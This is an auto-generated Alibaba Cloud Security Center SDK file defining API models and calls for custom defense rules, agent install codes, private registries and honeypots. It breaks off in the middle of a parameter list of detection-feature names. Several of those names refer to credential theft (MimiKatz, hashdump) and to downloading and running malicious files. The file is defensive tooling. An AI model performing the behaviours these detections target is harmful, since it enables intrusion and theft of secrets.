/**
 *
 */
import Util;
import OpenApi;
import OpenApiUtil;
import EndpointUtil;

extends OpenApi;


init(config: OpenApi.Config){
  super(config);
  @endpointRule = 'regional';
  @endpointMap = {
    cn-hangzhou = 'tds.aliyuncs.com',
    ap-southeast-1 = 'tds.ap-southeast-1.aliyuncs.com',
    ap-southeast-3 = 'tds.ap-southeast-3.aliyuncs.com',
    ap-northeast-1 = 'sas.aliyuncs.com',
    ap-northeast-2-pop = 'sas.aliyuncs.com',
    ap-south-1 = 'sas.aliyuncs.com',
    ap-southeast-2 = 'sas.aliyuncs.com',
    ap-southeast-5 = 'sas.aliyuncs.com',
    cn-beijing = 'sas.aliyuncs.com',
    cn-beijing-finance-1 = 'sas.aliyuncs.com',
    cn-beijing-finance-pop = 'sas.aliyuncs.com',
    cn-beijing-gov-1 = 'sas.aliyuncs.com',
    cn-beijing-nu16-b01 = 'sas.aliyuncs.com',
    cn-chengdu = 'sas.aliyuncs.com',
    cn-edge-1 = 'sas.aliyuncs.com',
    cn-fujian = 'sas.aliyuncs.com',
    cn-haidian-cm12-c01 = 'sas.aliyuncs.com',
    cn-hangzhou-bj-b01 = 'sas.aliyuncs.com',
    cn-hangzhou-finance = 'sas.aliyuncs.com',
    cn-hangzhou-internal-prod-1 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-1 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-2 = 'sas.aliyuncs.com',
    cn-hangzhou-internal-test-3 = 'sas.aliyuncs.com',
    cn-hangzhou-test-306 = 'sas.aliyuncs.com',
    cn-hongkong = 'sas.aliyuncs.com',
    cn-hongkong-finance-pop = 'sas.aliyuncs.com',
    cn-huhehaote = 'sas.aliyuncs.com',
    cn-huhehaote-nebula-1 = 'sas.aliyuncs.com',
    cn-north-2-gov-1 = 'sas.aliyuncs.com',
    cn-qingdao = 'sas.aliyuncs.com',
    cn-qingdao-nebula = 'sas.aliyuncs.com',
    cn-shanghai = 'sas.aliyuncs.com',
    cn-shanghai-et15-b01 = 'sas.aliyuncs.com',
    cn-shanghai-et2-b01 = 'sas.aliyuncs.com',
    cn-shanghai-finance-1 = 'sas.aliyuncs.com',
    cn-shanghai-inner = 'sas.aliyuncs.com',
    cn-shanghai-internal-test-1 = 'sas.aliyuncs.com',
    cn-shenzhen = 'sas.aliyuncs.com',
    cn-shenzhen-finance-1 = 'sas.aliyuncs.com',
    cn-shenzhen-inner = 'sas.aliyuncs.com',
    cn-shenzhen-st4-d01 = 'sas.aliyuncs.com',
    cn-shenzhen-su18-b01 = 'sas.aliyuncs.com',
    cn-wuhan = 'sas.aliyuncs.com',
    cn-wulanchabu = 'sas.aliyuncs.com',
    cn-yushanfang = 'sas.aliyuncs.com',
    cn-zhangbei = 'sas.aliyuncs.com',
    cn-zhangbei-na61-b01 = 'sas.aliyuncs.com',
    cn-zhangjiakou = 'sas.aliyuncs.com',
    cn-zhangjiakou-na62-a01 = 'sas.aliyuncs.com',
    cn-zhengzhou-nebula-1 = 'sas.aliyuncs.com',
    eu-central-1 = 'sas.aliyuncs.com',
    eu-west-1 = 'sas.aliyuncs.com',
    eu-west-1-oxs = 'sas.aliyuncs.com',
    me-east-1 = 'sas.aliyuncs.com',
    rus-west-1-pop = 'sas.aliyuncs.com',
    us-east-1 = 'sas.aliyuncs.com',
    us-west-1 = 'sas.aliyuncs.com',
  };

  checkConfig(config);
  @endpoint = getEndpoint('sas', @regionId, @endpointRule, @network, @suffix, @endpointMap, @endpoint);
}

function getEndpoint(productId: string, regionId: string, endpointRule: string, network: string, suffix: string, endpointMap: map[string]string, endpoint: string) throws: string{
  if (!Util.empty(endpoint)) {
    return endpoint;
  }
  
  if (!Util.isUnset(endpointMap) && !Util.empty(endpointMap[regionId])) {
    return endpointMap[regionId];
  }
  return EndpointUtil.getEndpointRules(productId, regionId, endpointRule, network, suffix);
}

model QueryIncidentTracingSubNodesCountRequest {
  vertexIdAndTypeList?: [[ string ]  ](name='VertexIdAndTypeList'),
}

model AddCheckInstanceResultWhiteListRequest {
  checkGroupId?: string(name='CheckGroupId', example='cQFq20UzZ49K6gRSJD1301****'),
  checkId?: long(name='CheckId', example='132'),
  instanceIds?: [ string ](name='InstanceIds'),
}

model AddCheckInstanceResultWhiteListResponseBody = {
  data?: map[string]any(name='Data'),
  requestId?: string(name='RequestId', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
}

model AddCheckInstanceResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddCheckInstanceResultWhiteListResponseBody(name='body'),
}

async function addCheckInstanceResultWhiteListWithOptions(request: AddCheckInstanceResultWhiteListRequest, runtime: Util.RuntimeOptions): AddCheckInstanceResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkGroupId)) {
    query['CheckGroupId'] = request.checkGroupId;
  }
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCheckInstanceResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addCheckInstanceResultWhiteList(request: AddCheckInstanceResultWhiteListRequest): AddCheckInstanceResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCheckInstanceResultWhiteListWithOptions(request, runtime);
}

model AddCheckResultWhiteListRequest {
  checkIds?: [ long ](name='CheckIds'),
}

model AddCheckResultWhiteListResponseBody = {
  data?: map[string]any(name='Data'),
  requestId?: string(name='RequestId', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
}

model AddCheckResultWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddCheckResultWhiteListResponseBody(name='body'),
}

async function addCheckResultWhiteListWithOptions(request: AddCheckResultWhiteListRequest, runtime: Util.RuntimeOptions): AddCheckResultWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddCheckResultWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addCheckResultWhiteList(request: AddCheckResultWhiteListRequest): AddCheckResultWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return addCheckResultWhiteListWithOptions(request, runtime);
}

model AddClientUserDefineRuleRequest {
  actionType?: int32(name='ActionType', description='The action of the custom defense rule. Valid values:

*   **0**: allow
*   **1**: block', example='1'),
  cmdline?: string(name='Cmdline', description='The command line.', example='/usr/sbin/s****'),
  filePath?: string(name='FilePath', description='The file path.', example='/etc/pam****'),
  IP?: string(name='IP', description='The IP address.', example='10.240.XX.XX'),
  md5List?: string(name='Md5List', description='The hash values of processes.', example='0c9045b5bec90f9825f1f3f64dd4****'),
  name?: string(name='Name', description='The name of the custom defense rule.', example='Rule 1'),
  newFilePath?: string(name='NewFilePath', description='The new file path after the file is renamed.', example='/etc/pam****'),
  parentCmdline?: string(name='ParentCmdline', description='The parent command line.', example='/usr/sbin/s****'),
  parentProcPath?: string(name='ParentProcPath', description='The path to the parent process.', example='c:/windows/system32/i****'),
  platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
  port?: int32(name='Port', description='The port number. This parameter is deprecated.', example='22'),
  portStr?: string(name='PortStr', description='The port number. Valid values: **1 to 65535**.', example='80'),
  procPath?: string(name='ProcPath', description='The path to the process.', example='c:/windows/system32/i****'),
  registryContent?: string(name='RegistryContent', description='The registry value.', example='*SECOH-QAD.exe*'),
  registryKey?: string(name='RegistryKey', description='The registry key.', example='HKEY_DYN_****'),
  type?: int32(name='Type', description='The type of the custom defense rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming', example='1'),
}

model AddClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
  userDefineRuleAddResult?: {
    id?: long(name='Id', description='The ID of the rule.', example='1'),
    platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
    switchId?: string(name='SwitchId', description='The switch ID of the custom defense rule.', example='USER-DEFINE-RULE-SWITCH-TYPE_200****'),
  }(name='UserDefineRuleAddResult', description='The identifier of the custom defense rule.'),
}

model AddClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddClientUserDefineRuleResponseBody(name='body'),
}

async function addClientUserDefineRuleWithOptions(request: AddClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): AddClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.actionType)) {
    query['ActionType'] = request.actionType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.filePath)) {
    query['FilePath'] = request.filePath;
  }
  if (!Util.isUnset(request.IP)) {
    query['IP'] = request.IP;
  }
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.newFilePath)) {
    query['NewFilePath'] = request.newFilePath;
  }
  if (!Util.isUnset(request.parentCmdline)) {
    query['ParentCmdline'] = request.parentCmdline;
  }
  if (!Util.isUnset(request.parentProcPath)) {
    query['ParentProcPath'] = request.parentProcPath;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.portStr)) {
    query['PortStr'] = request.portStr;
  }
  if (!Util.isUnset(request.procPath)) {
    query['ProcPath'] = request.procPath;
  }
  if (!Util.isUnset(request.registryContent)) {
    query['RegistryContent'] = request.registryContent;
  }
  if (!Util.isUnset(request.registryKey)) {
    query['RegistryKey'] = request.registryKey;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addClientUserDefineRule(request: AddClientUserDefineRuleRequest): AddClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return addClientUserDefineRuleWithOptions(request, runtime);
}

model AddInstallCodeRequest {
  expiredDate?: long(name='ExpiredDate', description='The validity period of the installation command. The value is a 13-digit timestamp.

>  The installation command is valid only within the validity period. An expired installation command cannot be used to install the Security Center agent.', example='1680257463853'),
  groupId?: long(name='GroupId', description='The ID of the asset group to which the you want to add the asset.

>  You can call the [DescribeAllGroups](~~describeallgroups~~) operation to query the IDs of asset groups.', example='8076980'),
  onlyImage?: boolean(name='OnlyImage', description='Specifies whether to create an image. Default value: **false**. Valid values:

*   **false**: does not create an image.
*   **true**: creates an image.', example='false'),
  os?: string(name='Os', description='The operating system of the instance. Default value: **linux**. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux'),
  vendorName?: string(name='VendorName', description='The name of the service provider for the asset. Default value: **ALIYUN**.

>  You can call the [DescribeVendorList](~~DescribeVendorList~~) operation to query the names of service providers.', example='ALIYUN'),
}

model AddInstallCodeResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model AddInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddInstallCodeResponseBody(name='body'),
}

async function addInstallCodeWithOptions(request: AddInstallCodeRequest, runtime: Util.RuntimeOptions): AddInstallCodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.expiredDate)) {
    query['ExpiredDate'] = request.expiredDate;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.onlyImage)) {
    query['OnlyImage'] = request.onlyImage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.vendorName)) {
    query['VendorName'] = request.vendorName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addInstallCode(request: AddInstallCodeRequest): AddInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return addInstallCodeWithOptions(request, runtime);
}

model AddPrivateRegistryRequest {
  domainName?: string(name='DomainName', example='example.com'),
  extraParam?: string(name='ExtraParam', example='[{"namespace":"aa","authToken":"aa"}]'),
  netType?: long(name='NetType', example='2'),
  password?: string(name='Password', example='******'),
  protocolType?: long(name='ProtocolType', example='2'),
  registryHostIp?: string(name='RegistryHostIp', example='114.55.**.**'),
  registryRegionId?: string(name='RegistryRegionId', example='cn-hangzhou'),
  registryType?: string(name='RegistryType', example='harbor'),
  registryVersion?: string(name='RegistryVersion', example='V2'),
  transPerHour?: int32(name='TransPerHour', example='10'),
  userName?: string(name='UserName', example='xxxxx'),
  vpcId?: string(name='VpcId', example='vpc-wz9hs3e5*******908kd'),
}

model AddPrivateRegistryResponseBody = {
  data?: {
    aliUid?: long(name='AliUid', example='1766185894104***'),
    domainName?: string(name='DomainName', example='example.com'),
    id?: long(name='Id', example='273698***'),
    netType?: long(name='NetType', example='2'),
    password?: string(name='Password', example='***********'),
    protocolType?: long(name='ProtocolType', example='2'),
    regionId?: string(name='RegionId', example='cn-hangzhou'),
    registryHostIp?: string(name='RegistryHostIp', example='114.55.**.**'),
    registryType?: string(name='RegistryType', example='harbor'),
    registryVersion?: string(name='RegistryVersion', example='V2'),
    token?: string(name='Token', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', example='10'),
    userName?: string(name='UserName', example='******'),
    vpcId?: string(name='VpcId', example='vpc-2vchkxmf2j9yjt3x2****'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model AddPrivateRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddPrivateRegistryResponseBody(name='body'),
}

async function addPrivateRegistryWithOptions(request: AddPrivateRegistryRequest, runtime: Util.RuntimeOptions): AddPrivateRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.domainName)) {
    query['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.extraParam)) {
    query['ExtraParam'] = request.extraParam;
  }
  if (!Util.isUnset(request.netType)) {
    query['NetType'] = request.netType;
  }
  if (!Util.isUnset(request.password)) {
    query['Password'] = request.password;
  }
  if (!Util.isUnset(request.protocolType)) {
    query['ProtocolType'] = request.protocolType;
  }
  if (!Util.isUnset(request.registryHostIp)) {
    query['RegistryHostIp'] = request.registryHostIp;
  }
  if (!Util.isUnset(request.registryRegionId)) {
    query['RegistryRegionId'] = request.registryRegionId;
  }
  if (!Util.isUnset(request.registryType)) {
    query['RegistryType'] = request.registryType;
  }
  if (!Util.isUnset(request.registryVersion)) {
    query['RegistryVersion'] = request.registryVersion;
  }
  if (!Util.isUnset(request.transPerHour)) {
    query['TransPerHour'] = request.transPerHour;
  }
  if (!Util.isUnset(request.userName)) {
    query['UserName'] = request.userName;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddPrivateRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addPrivateRegistry(request: AddPrivateRegistryRequest): AddPrivateRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return addPrivateRegistryWithOptions(request, runtime);
}

model AddTagWithUuidRequest {
  tagName?: string(name='TagName', example='InternetIp'),
  uuidList?: string(name='UuidList', example='71f5313e-4355-4c59-86d1-557dda7b****,71f5313e-4355-4c59-86d1-557dda7b****'),
}

model AddTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
}

model AddTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddTagWithUuidResponseBody(name='body'),
}

async function addTagWithUuidWithOptions(request: AddTagWithUuidRequest, runtime: Util.RuntimeOptions): AddTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addTagWithUuid(request: AddTagWithUuidRequest): AddTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return addTagWithUuidWithOptions(request, runtime);
}

model AddUninstallClientsByUuidsRequest {
  callMethod?: string(name='CallMethod', description='The method name. Default value: init.', example='init'),
  feedback?: string(name='Feedback', description='The feedback.', example='reinstall'),
  region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='1.2.XXX.XXX'),
  uuids?: string(name='Uuids', description='The UUID of the server that you want to unbind. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='inet-183707ae-3bdf-4db0-b771-3e9962bf****,inet-49dceccc-4f01-469b-8411-2416ea12****'),
}

model AddUninstallClientsByUuidsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3956048F-9D73-5EDB-834B-4827BB483977'),
}

model AddUninstallClientsByUuidsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddUninstallClientsByUuidsResponseBody(name='body'),
}

async function addUninstallClientsByUuidsWithOptions(request: AddUninstallClientsByUuidsRequest, runtime: Util.RuntimeOptions): AddUninstallClientsByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.callMethod)) {
    query['CallMethod'] = request.callMethod;
  }
  if (!Util.isUnset(request.feedback)) {
    query['Feedback'] = request.feedback;
  }
  if (!Util.isUnset(request.region)) {
    query['Region'] = request.region;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddUninstallClientsByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addUninstallClientsByUuids(request: AddUninstallClientsByUuidsRequest): AddUninstallClientsByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return addUninstallClientsByUuidsWithOptions(request, runtime);
}

model AddVpcHoneyPotRequest {
  vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC) in which you want to create a honeypot.

> You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to obtain the VPC ID. The VPC ID is the value of the InstanceId parameter.', example='vpc-p0w5fgkfsl5a6791q****'),
}

model AddVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model AddVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AddVpcHoneyPotResponseBody(name='body'),
}

async function addVpcHoneyPotWithOptions(request: AddVpcHoneyPotRequest, runtime: Util.RuntimeOptions): AddVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AddVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function addVpcHoneyPot(request: AddVpcHoneyPotRequest): AddVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return addVpcHoneyPotWithOptions(request, runtime);
}

model AdvanceSecurityEventOperationsRequest {
  eventName?: string(name='EventName'),
  eventType?: string(name='EventType'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  ruleId?: int32(name='RuleId', example='123'),
}

model AdvanceSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-XXXXXXXXX'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', example='file path'),
          filedName?: string(name='FiledName', example='filePath'),
          markMisType?: string(name='MarkMisType', example='contains'),
          markMisValue?: string(name='MarkMisValue', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType'),
        }
      ](name='MarkField'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', example='file path'),
          filedName?: string(name='FiledName', example='filePath'),
          markMisValue?: string(name='MarkMisValue', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType'),
        }
      ](name='MarkFieldsSource'),
      operationCode?: string(name='OperationCode', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', example='{\\"subOperation\\":\\"killByMd5andPath\\"}'),
      userCanOperate?: boolean(name='UserCanOperate', example='false'),
    }
  ](name='SecurityEventOperationsResponse'),
}

model AdvanceSecurityEventOperationsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: AdvanceSecurityEventOperationsResponseBody(name='body'),
}

async function advanceSecurityEventOperationsWithOptions(request: AdvanceSecurityEventOperationsRequest, runtime: Util.RuntimeOptions): AdvanceSecurityEventOperationsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.eventType)) {
    query['EventType'] = request.eventType;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'AdvanceSecurityEventOperations',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function advanceSecurityEventOperations(request: AdvanceSecurityEventOperationsRequest): AdvanceSecurityEventOperationsResponse {
  var runtime = new Util.RuntimeOptions{};
  return advanceSecurityEventOperationsWithOptions(request, runtime);
}

model BatchOperateCommonOverallConfigRequest {
  config?: string(name='Config', description='The status of the feature. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on'),
  typeList?: [ string ](name='TypeList', description='The type of the feature in proactive defense. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz Credential Stealing (Windows)
